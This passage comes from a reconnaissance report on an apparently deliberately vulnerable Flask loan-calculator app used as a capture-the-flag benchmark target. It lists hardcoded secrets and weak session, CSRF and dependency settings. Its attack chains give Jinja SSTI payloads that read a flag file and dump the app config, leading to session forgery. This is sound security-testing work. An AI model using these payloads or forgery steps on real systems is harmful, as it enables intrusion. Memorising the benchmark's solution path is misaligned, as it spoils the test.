**Static File Serving:** Flask's default static file handler (no custom file serving endpoints).

**Note:** File read operations CAN be achieved indirectly via SSTI exploitation.

### Insecure Deserialization - NONE FOUND

**Status:** No insecure deserialization vulnerabilities detected.

**Reason:** No dangerous deserialization functions used.

**Verified Absent:**
- No `pickle.loads()`, `pickle.load()`, `yaml.load()` (unsafe), `marshal.loads()`
- Session deserialization handled by Flask's signed cookies (uses itsdangerous, safe)
- Only `json.loads()` used for parsing rendered template output (`routes.py:125`) - safe, JSON parsing doesn't execute code

---

## 10. Additional Attack Vectors

### Hardcoded Secrets

**Flask Secret Key - CRITICAL:**
- **Location:** `__init__.py:9`
- **Value:** `'your_secret_key'`
- **Impact:** Enables session forgery, complete authentication bypass
- **Exploitation:** Craft arbitrary session cookies with any `user_id` value

**MySQL Root Credentials:**
- **Location:** `__init__.py:12`
- **Connection String:** `mysql+pymysql://root:loan_calculator@db/database`
- **Impact:** If leaked via SSTI, enables direct database access with root privileges

**Default Test Credentials:**
- **Location:** `__init__.py:21-35`
- **Username:** `test`
- **Password:** `test`
- **Impact:** Immediate authenticated access without brute force

### Session Management Weaknesses

**Missing Cookie Security Flags:**
- **HttpOnly:** NOT SET - Session cookies accessible via JavaScript (`document.cookie`)
- **Secure:** NOT SET - Cookies transmitted over HTTP (no TLS enforcement)
- **SameSite:** NOT SET - CSRF attacks possible (combined with wildcard CORS)

**No Session Timeout:**
- Sessions persist indefinitely (no `PERMANENT_SESSION_LIFETIME` configuration)
- No inactivity timeout
- No absolute session expiration

**No Session Regeneration:**
- Session ID not regenerated after login (vulnerable to session fixation)
- No call to `session.clear()` or session rotation logic

### CSRF Vulnerabilities

**All POST Endpoints Lack CSRF Protection:**
- `/login` (POST) - No CSRF token validation
- `/profile` (POST) - No CSRF token validation
- Wildcard CORS policy (`Access-Control-Allow-Origin: *`) exacerbates CSRF risk

### Information Disclosure

**HTML Comment in Login Template:**
- **Location:** `login.html:11` (not in source code provided, but mentioned in pre-recon)
- **Content:** `<!-- TODO: Delete the testing account (test:test). -->`
- **Impact:** Exposes default credentials to anyone viewing page source

**Exposed Git Repository (Port 8888 - Out of Scope for Target):**
- **Finding:** Nmap detected `.git` repository on port 8888 via SimpleHTTPServer
- **Note:** This is separate from the target application but demonstrates information disclosure risk

### Legacy Dependencies

**MySQL 5.7.15 (September 2016):**
- **Known CVEs:** CVE-2017-3599, CVE-2017-3600, CVE-2017-3651
- **Impact:** 7+ years outdated, multiple privilege escalation and DoS vulnerabilities
- **Recommendation:** Upgrade to MySQL 8.0.x or minimum MySQL 5.7.44

---

## 11. Summary of Critical Findings

### Vulnerability Priority Matrix

| Priority | Vulnerability | Category | Impact | Exploitability | Location |
|---|---|---|---|---|---|
| **P0** | Server-Side Template Injection (SSTI) | Injection | RCE, Full Compromise | HIGH (bypassable blacklist) | `routes.py:99-131` |
| **P0** | Hardcoded Secret Key | Authentication | Session Forgery, Auth Bypass | HIGH (known secret) | `__init__.py:9` |
| **P0** | No Object-Level Authorization | Authorization | Horizontal Privilege Escalation | HIGH (session forgery) | All protected endpoints |
| **P1** | Plaintext Password Storage | Authentication | Credential Disclosure | MEDIUM (requires DB access) | `models.py:8`, `routes.py:31` |
| **P1** | IDOR in /profile (POST) | Authorization | Data Modification | HIGH (session forgery + mass assignment) | `routes.py:62-83` |
| **P1** | Default Credentials | Authentication | Unauthorized Access | HIGH (test:test documented) | `__init__.py:21-35` |
| **P2** | Missing CSRF Protection | Session Management | CSRF Attacks | MEDIUM (requires user interaction) | All POST endpoints |
| **P2** | Missing Session Security Flags | Session Management | Session Hijacking | MEDIUM (requires XSS or network MITM) | `__init__.py` (not configured) |
| **P2** | Legacy MySQL Version | Infrastructure | Known CVE Exploitation | LOW (internal network only) | `mysql/Dockerfile` |

### Attack Chains

**Primary Attack Path (CTF Flag Retrieval):**
1. Authenticate with `test:test` credentials
2. Exploit SSTI in `/total_loan_payments` with payload: `{% with open('/flag') as f %}{{ f.read() }}{% endwith %}`
3. Retrieve CTF flag from response

**Alternative Attack Path (Full Compromise):**
1. Exploit SSTI to leak Flask config: `{% for key in config %}{{ key }}: {{ config[key] }}{% endfor %}`
2. Extract secret key `'your_secret_key'` and database credentials
3. Forge session cookies with arbitrary `user_id` values
4. Access all users' data via IDOR
5. Optionally: Use SSTI for RCE and database root access

---

## RECONNAISSANCE COMPLETE

This reconnaissance deliverable provides a comprehensive attack surface map of the XBEN-063-24 Flask application. Key findings include:

- **7 HTTP endpoints** on port 80 (HTTP only, no TLS)
- **No role-based access control** (flat authorization model)
- **Critical SSTI vulnerability** enabling RCE in `/total_loan_payments`
- **Hardcoded secrets** enabling session forgery and database compromise
- **Plaintext password storage** in MySQL database
- **No defense-in-depth:** Missing CSRF protection, session security flags, input validation, logging, and monitoring

The SSTI vulnerability provides the primary exploitation path for CTF flag retrieval and potential full system compromise. Session forgery (enabled by hardcoded secret key) allows horizontal privilege escalation across all user accounts.

All subsequent analysis phases (Injection, XSS, Auth, Authz, SSRF) should prioritize:
1. SSTI exploitation techniques and blacklist bypass methods
2. Session forgery and IDOR attack vectors
3. Mass assignment vulnerabilities in profile update functionality
4. Default credential abuse and authentication bypass scenarios